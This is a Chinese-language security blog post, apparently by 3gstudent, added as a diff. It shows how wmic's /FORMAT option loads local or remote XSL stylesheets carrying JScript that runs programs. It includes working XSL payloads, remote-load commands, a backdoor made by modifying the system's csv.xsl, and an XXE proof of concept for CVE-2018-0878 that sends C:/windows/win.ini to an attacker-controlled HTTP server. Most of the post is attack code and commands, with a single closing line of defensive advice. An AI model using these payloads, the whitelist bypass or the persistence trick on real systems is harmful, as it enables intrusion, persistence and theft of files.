@@ -1,0 +1,317 @@
+<article class="post">
+  <h1>利用wmic调用xsl文件的分析与利用</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>Casey Smith@subTee在博客分享的一个技巧，使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本。这个发现很有用，不仅可以作为一种白名单绕过的方法，而且可以作为payload来使用(从URL调用XSL脚本，利用XSL执行exe、shellcode、powershell脚本)。</p>
+
+<p>本文将要对该项技术进行测试，结合自己的经验对其扩展，分享一个后门利用的思路，介绍同XXE漏洞结合的使用方法。</p>
+
+<p>博客地址：</p>
+
+<p>https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>测试Casey Smith的方法</li>
+  <li>脚本分析，分析后门利用思路</li>
+  <li>编写后门利用脚本</li>
+  <li>同XXE漏洞的结合</li>
+</ul>
+
+<h2 id="0x02-测试casey-smith的方法">0x02 测试Casey Smith的方法</h2>
+<hr>
+
+<p>本地：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process list /FORMAT:evil.xsl
+</code></pre></div></div>
+
+<p>远程：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /FORMAT:"https://example.com/evil.xsl"
+</code></pre></div></div>
+
+<p>xsl文件内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
+&lt;stylesheet
+xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="placeholder"
+version="1.0"&gt;
+&lt;output method="text"/&gt;
+	&lt;ms:script implements-prefix="user" language="JScript"&gt;
+	&lt;![CDATA[
+	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	]]&gt; &lt;/ms:script&gt;
+&lt;/stylesheet&gt;
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>代码来源于https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl</p>
+
+<h2 id="0x03-脚本分析">0x03 脚本分析</h2>
+<hr>
+
+<p>查看xsl文件格式，发现类似于之前研究过的利用脚本(使用msxsl.exe执行xsl脚本，也是学习自Casey Smith)，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
+&lt;xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+      xmlns:user="http://mycompany.com/mynamespace"&gt;
+
+&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
+   function xml(nodelist) {
+	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+      return nodelist.nextNode().xml;
+	  
+   }
+&lt;/msxsl:script&gt;
+&lt;xsl:template match="/"&gt;
+   &lt;xsl:value-of select="user:xml(.)"/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>代码来源于https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</p>
+
+<p>我对该技术的分析文章链接：</p>
+
+<p>https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</p>
+
+<p>经测试，文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">《Use msxsl to bypass AppLocker》</a>中使用的xsl脚本和xml脚本wmic均支持，只是对后缀名有要求(必须是xsl文件)</p>
+
+<h3 id="实际测试">实际测试：</h3>
+
+<p>执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:"https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml"
+</code></pre></div></div>
+
+<p>执行失败，提示<code class="language-plaintext highlighter-rouge">Invalid XSL format (or) file name.</code></p>
+
+<p>脚本内容不变，后缀名改为xsl，再次执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:"https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl"
+</code></pre></div></div>
+
+<p>执行成功，成功弹出计算器，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/2-1.png" alt="Alt text"></p>
+
+<h3 id="补充-xsl和xml文件的异同">补充： xsl和xml文件的异同</h3>
+
+<h4 id="相同点">相同点：</h4>
+
+<p>语法规则基本相同，仅声明方式不同(以上测试代码未体现)</p>
+
+<h4 id="不同点">不同点：</h4>
+
+<p>用途不同，xml用于承载数据，xsl用户设置数据的格式</p>
+
+<h4 id="简单理解">简单理解：</h4>
+
+<p>通过使用XSL可以向XML文件添加显示信息，使用XSL显示XML</p>
+
+<h2 id="0x04-后门利用思路">0x04 后门利用思路</h2>
+<hr>
+
+<p>通过学习Casey Smith在博客中分享的研究思路，我想到了一个后门利用的思路</p>
+
+<p>对于路径<code class="language-plaintext highlighter-rouge">c:\Windows\System32\wbem</code>下的xsl文件</p>
+
+<p>例如：</p>
+
+<ul>
+  <li>csv.xsl</li>
+  <li>htable.xsl</li>
+  <li>texttable.xsl</li>
+</ul>
+
+<p>同wmic命令的输出格式相对应，例如：</p>
+
+<ul>
+  <li>wmic os get /format:csv</li>
+  <li>wmic os get /format:htable</li>
+  <li>wmic os get /format:texttable</li>
+</ul>
+
+<p>那么，使用wmic命令在输出格式时是否会加载对应名称的xsl文件呢？</p>
+
+<p>答案是肯定的</p>
+
+<p>挑选其中的csv.xsl，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
+&lt;!-- Copyright (c) Microsoft Corporation.  All rights reserved. --&gt;
+&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"&gt;
+&lt;xsl:output encoding="utf-16" omit-xml-declaration="yes"/&gt;
+&lt;xsl:param name="norefcomma"/&gt;
+
+&lt;xsl:template match="/"&gt;
+Node,&lt;xsl:for-each select="COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE"&gt;&lt;xsl:value-of select="@NAME"/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select="COMMAND/RESULTS"/&gt;&lt;/xsl:template&gt; 
+
+&lt;xsl:template match="RESULTS" xml:space="preserve"&gt;&lt;xsl:apply-templates select="CIM/INSTANCE"/&gt;&lt;/xsl:template&gt; 
+&lt;xsl:template match="VALUE.ARRAY" xml:space="preserve"&gt;{&lt;xsl:for-each select="VALUE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt;
+&lt;xsl:template match="VALUE" xml:space="preserve"&gt;&lt;xsl:value-of select="."/&gt;&lt;/xsl:template&gt;
+&lt;xsl:template match="INSTANCE" xml:space="preserve"&gt;
+&lt;xsl:value-of select="../../@NODE"/&gt;,&lt;xsl:for-each select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; 
+
+&lt;xsl:template match="PROPERTY.REFERENCE" xml:space="preserve"&gt;&lt;xsl:apply-templates select="VALUE.REFERENCE"&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt;
+
+&lt;xsl:template match="PROPERTY"&gt;&lt;xsl:apply-templates select="VALUE"/&gt;&lt;/xsl:template&gt;
+&lt;xsl:template match="PROPERTY.ARRAY"&gt;&lt;xsl:for-each select="VALUE.ARRAY"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;
+
+&lt;xsl:template match="VALUE.REFERENCE"&gt;"&lt;xsl:apply-templates select="INSTANCEPATH/NAMESPACEPATH"/&gt;&lt;xsl:apply-templates select="INSTANCEPATH/INSTANCENAME|INSTANCENAME"/&gt;"&lt;/xsl:template&gt;
+
+&lt;xsl:template match="NAMESPACEPATH"&gt;\\&lt;xsl:value-of select="HOST/text()"/&gt;&lt;xsl:for-each select="LOCALNAMESPACEPATH/NAMESPACE"&gt;\&lt;xsl:value-of select="@NAME"/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt;
+
+&lt;xsl:template match="INSTANCENAME"&gt;&lt;xsl:value-of select="@CLASSNAME"/&gt;&lt;xsl:for-each select="KEYBINDING"&gt;&lt;xsl:if test="position()=1"&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select="@NAME"/&gt;="&lt;xsl:value-of select="KEYVALUE/text()"/&gt;"&lt;xsl:if test="position()!=last()"&gt;&lt;/xsl:if&gt;&lt;xsl:if test="not($norefcomma=&amp;quot;true&amp;quot;)"&gt;,&lt;/xsl:if&gt;&lt;xsl:if test="$norefcomma=&amp;quot;true&amp;quot;"&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;
+
+
+&lt;/xsl:stylesheet&gt;
+</code></pre></div></div>
+
+<p>尝试在代码中添加payload，修改后的内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
+&lt;!-- Copyright (c) Microsoft Corporation.  All rights reserved. --&gt;
+&lt;xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+      xmlns:user="urn:my-scripts"&gt;
+&lt;xsl:output encoding="utf-16" omit-xml-declaration="yes"/&gt;
+&lt;xsl:param name="norefcomma"/&gt;
+
+&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
+   function myFunction() {
+	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+      	return "";	  
+   }
+&lt;/msxsl:script&gt;
+
+&lt;xsl:template match="/"&gt;
+
+&lt;xsl:value-of select="user:myFunction()"/&gt;
+
+Node,&lt;xsl:for-each select="COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE"&gt;&lt;xsl:value-of select="@NAME"/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select="COMMAND/RESULTS"/&gt;&lt;/xsl:template&gt; 
+
+
+&lt;xsl:template match="RESULTS" xml:space="preserve"&gt;&lt;xsl:apply-templates select="CIM/INSTANCE"/&gt;&lt;/xsl:template&gt; 
+&lt;xsl:template match="VALUE.ARRAY" xml:space="preserve"&gt;{&lt;xsl:for-each select="VALUE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt;
+&lt;xsl:template match="VALUE" xml:space="preserve"&gt;&lt;xsl:value-of select="."/&gt;&lt;/xsl:template&gt;
+&lt;xsl:template match="INSTANCE" xml:space="preserve"&gt;
+&lt;xsl:value-of select="../../@NODE"/&gt;,&lt;xsl:for-each select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; 
+
+&lt;xsl:template match="PROPERTY.REFERENCE" xml:space="preserve"&gt;&lt;xsl:apply-templates select="VALUE.REFERENCE"&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt;
+
+&lt;xsl:template match="PROPERTY"&gt;&lt;xsl:apply-templates select="VALUE"/&gt;&lt;/xsl:template&gt;
+&lt;xsl:template match="PROPERTY.ARRAY"&gt;&lt;xsl:for-each select="VALUE.ARRAY"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;
+
+&lt;xsl:template match="VALUE.REFERENCE"&gt;"&lt;xsl:apply-templates select="INSTANCEPATH/NAMESPACEPATH"/&gt;&lt;xsl:apply-templates select="INSTANCEPATH/INSTANCENAME|INSTANCENAME"/&gt;"&lt;/xsl:template&gt;
+
+&lt;xsl:template match="NAMESPACEPATH"&gt;\\&lt;xsl:value-of select="HOST/text()"/&gt;&lt;xsl:for-each select="LOCALNAMESPACEPATH/NAMESPACE"&gt;\&lt;xsl:value-of select="@NAME"/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt;
+
+&lt;xsl:template match="INSTANCENAME"&gt;&lt;xsl:value-of select="@CLASSNAME"/&gt;&lt;xsl:for-each select="KEYBINDING"&gt;&lt;xsl:if test="position()=1"&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select="@NAME"/&gt;="&lt;xsl:value-of select="KEYVALUE/text()"/&gt;"&lt;xsl:if test="position()!=last()"&gt;&lt;/xsl:if&gt;&lt;xsl:if test="not($norefcomma=&amp;quot;true&amp;quot;)"&gt;,&lt;/xsl:if&gt;&lt;xsl:if test="$norefcomma=&amp;quot;true&amp;quot;"&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;
+
+
+&lt;/xsl:stylesheet&gt;
+</code></pre></div></div>
+
+<p>替换原文件，需要管理员权限</p>
+
+<p><strong>注：</strong></p>
+
+<p>csv.xsl的路径同系统语言版本有关，如果是英文系统，路径为<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wbem\en-US</code>，如果是中文系统，路径为<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wbem\zh-CN</code></p>
+
+<p>测试使用wmic的输出格式命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:csv
+</code></pre></div></div>
+
+<p>执行payload，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/2-2.png" alt="Alt text"></p>
+
+<h2 id="0x05-同xxe漏洞的结合">0x05 同XXE漏洞的结合</h2>
+<hr>
+
+<p>XXE是XML External Entity attack的缩写</p>
+
+<p>前不久一个和Windows相关的XXE漏洞：CVE-2018-0878</p>
+
+<p>poc地址如下：</p>
+
+<p>https://www.exploit-db.com/exploits/44352/</p>
+
+<p>同样可在wmic命令上触发</p>
+
+<h3 id="漏洞测试">漏洞测试：</h3>
+
+<h4 id="1使用kali-linux建立httt服务器">1、使用kali linux建立httt服务器</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m SimpleHTTPServer 8080
+</code></pre></div></div>
+
+<h4 id="2kali-linux目录下创建文件xxexml">2、kali linux目录下创建文件xxe.xml</h4>
+
+<p>内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % payload SYSTEM "file:///C:/windows/win.ini"&gt;  
+&lt;!ENTITY % root "&lt;!ENTITY &amp;#37; oob SYSTEM 'http://192.168.62.140:8080/?%payload;'&gt; "&gt;  
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>kali linux的IP为192.168.62.140</p>
+
+<h4 id="3创建payloadxsl">3、创建payload.xsl</h4>
+
+<p>内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;  
+&lt;!DOCTYPE zsl [  
+&lt;!ENTITY % remote SYSTEM "http://192.168.62.140:8080/xxe.xml"&gt;  
+%remote;%root;%oob;]&gt;
+</code></pre></div></div>
+
+<h4 id="4windows系统使用wmic加载该xsl文件">4、windows系统使用wmic加载该xsl文件</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:payload.xsl
+</code></pre></div></div>
+
+<p>执行失败，提示<code class="language-plaintext highlighter-rouge">Invalid XSL format (or) file name.</code></p>
+
+<p>然而，漏洞成功触发，服务器获得文件<code class="language-plaintext highlighter-rouge">C:/windows/win.ini</code>的内容，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/3-1.png" alt="Alt text"></p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr>
+
+<p>本文测试了使用wmic从本地或从URL调用XSL文件的方法，分享了一个后门利用的思路，并结合CVE-2018-0878对XXE漏洞进行了测试。
+站在防御的角度，如果wmic.exe发起了网络连接，那么很有可能是加载了特殊xsl文件的原因，值得注意。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on April 23, 2018
+  </div>
+
+  
+</article>
